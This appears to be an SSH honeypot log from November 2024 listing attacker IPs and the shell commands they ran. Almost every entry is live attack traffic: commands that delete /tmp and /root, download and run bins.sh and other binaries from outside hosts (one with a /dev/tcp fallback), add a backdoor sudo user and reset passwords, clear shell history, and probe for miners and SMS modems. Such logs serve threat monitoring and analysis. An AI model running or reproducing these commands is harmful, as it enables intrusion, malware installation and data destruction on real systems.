+2024-11-21 01:03:28.942766 - ('37.44.238.68', 37286) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:30.932574 - ('37.44.238.68', 37322) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:32.490590 - ('37.44.238.68', 37326) - whoami
+2024-11-21 01:03:35.224430 - ('37.44.238.68', 37354) - whoami
+2024-11-21 01:03:36.898567 - ('37.44.238.68', 37358) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:39.304215 - ('37.44.238.68', 37362) - whoami
+2024-11-21 01:03:42.561839 - ('37.44.238.68', 39666) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:44.623663 - ('37.44.238.68', 39676) - whoami
+2024-11-21 01:03:46.831371 - ('37.44.238.68', 39690) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:49.061149 - ('37.44.238.68', 46466) - whoami
+2024-11-21 01:03:51.464323 - ('37.44.238.68', 46476) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:54.501001 - ('37.44.238.68', 46490) - whoami
+2024-11-21 01:03:56.790133 - ('37.44.238.68', 46498) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:58.846492 - ('37.44.238.68', 46508) - whoami
+2024-11-21 01:04:01.074303 - ('37.44.238.68', 46510) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:03.026764 - ('37.44.238.68', 52812) - whoami
+2024-11-21 01:04:05.846925 - ('37.44.238.68', 52820) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:08.570601 - ('37.44.238.68', 52832) - whoami
+2024-11-21 01:04:10.010250 - ('37.44.238.68', 52842) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:12.279969 - ('37.44.238.68', 36644) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:14.618857 - ('37.44.238.68', 36652) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:16.958476 - ('37.44.238.68', 59718) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:18.905959 - ('37.44.238.68', 59728) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:20.898056 - ('37.44.238.68', 37182) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:24.235134 - ('37.44.238.68', 37190) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:04:27.013390 - ('37.44.238.68', 37344) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:36:43.234455 - ('87.120.113.231', 52886) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-21 02:34:24.532596 - ('46.19.143.66', 45792) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 CEJvmrdY) system && sudo usermod -aG sudo system
+2024-11-21 02:34:25.022838 - ('46.19.143.66', 45792) - lscpu && echo -e "CEJvmrdY\nCEJvmrdY" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-21 02:35:27.538058 - ('90.133.130.57', 37504) - /ip cloud print
+2024-11-21 02:35:28.420622 - ('90.133.130.57', 37504) - ifconfig
+2024-11-21 02:35:29.131438 - ('90.133.130.57', 37504) - uname -a
+2024-11-21 02:35:29.845289 - ('90.133.130.57', 37504) - cat /proc/cpuinfo
+2024-11-21 02:35:30.559529 - ('90.133.130.57', 37504) - ps | grep '[Mm]iner'
+2024-11-21 02:35:31.272423 - ('90.133.130.57', 37504) - ps -ef | grep '[Mm]iner'
+2024-11-21 02:35:31.983879 - ('90.133.130.57', 37504) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-21 02:35:32.707455 - ('90.133.130.57', 37504) - echo Hi | cat -n
+2024-11-21 04:21:21.599742 - ('87.120.113.231', 33272) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-21 08:41:59.512629 - ('87.120.113.231', 43078) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-21 09:38:21.180334 - ('92.255.57.132', 41622) - echo 'SSH check'
+2024-11-21 10:01:08.774294 - ('200.100.26.250', 50624) - scp -t /tmp/NLrIwPX1
+2024-11-21 10:01:09.523866 - ('200.100.26.250', 50628) - scp -t /tmp/NLrIwPX1
+2024-11-21 10:15:42.890776 - ('46.19.143.66', 38078) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 gjjjwXk4) system && sudo usermod -aG sudo system
+2024-11-21 10:15:43.632339 - ('46.19.143.66', 38078) - lscpu && echo -e "gjjjwXk4\ngjjjwXk4" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-21 10:56:14.122528 - ('92.255.57.132', 56100) - echo 'SSH check'
+2024-11-21 11:59:53.055554 - ('92.255.57.132', 55818) - echo 'SSH check'
+2024-11-21 13:00:20.611568 - ('92.255.57.132', 55432) - echo 'SSH check'
+2024-11-21 13:31:04.584792 - ('218.92.0.132', 57634) - #!/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wget http://43.249.172.195:888/112
+curl -O http://43.249.172.195:888/112
+chmod +x 112
+./112
+wget http://43.249.172.195:888/112s
+curl -O http://43.249.172.195:888/112s
+chmod +x 112s
+./112s
+rm -rf 112.sh
+rm -rf 112
+rm -rf 112s
+history -c
+
+2024-11-21 13:31:06.772834 - ('218.92.0.132', 57634) - ls -la /var/run/gcc.pid
+2024-11-21 13:47:13.894321 - ('144.126.222.68', 40660) - uname -s -m
+2024-11-21 14:00:07.222771 - ('92.255.57.132', 39966) - echo 'SSH check'
+2024-11-21 14:59:25.428403 - ('92.255.57.132', 52504) - echo 'SSH check'
+2024-11-21 15:58:52.295539 - ('92.255.57.132', 40068) - echo 'SSH check'
+2024-11-21 15:59:40.588312 - ('46.19.143.66', 42670) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Rp8Wk8zh) system && sudo usermod -aG sudo system
+2024-11-21 15:59:41.207756 - ('46.19.143.66', 42670) - lscpu && echo -e "Rp8Wk8zh\nRp8Wk8zh" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-21 16:57:19.559638 - ('92.255.57.132', 36986) - echo 'SSH check'
+2024-11-21 16:59:48.343787 - ('210.245.54.214', 50972) - scp -t /tmp/rN8g0bGd
+2024-11-21 16:59:49.428175 - ('210.245.54.214', 50976) - scp -t /tmp/rN8g0bGd
+2024-11-21 17:55:38.235504 - ('92.255.57.132', 39034) - echo 'SSH check'
+2024-11-21 18:53:44.422858 - ('92.255.57.132', 46562) - echo 'SSH check'
+2024-11-21 19:51:55.439680 - ('92.255.57.132', 34778) - echo 'SSH check'
+2024-11-21 20:49:31.851634 - ('92.255.57.132', 52912) - echo 'SSH check'
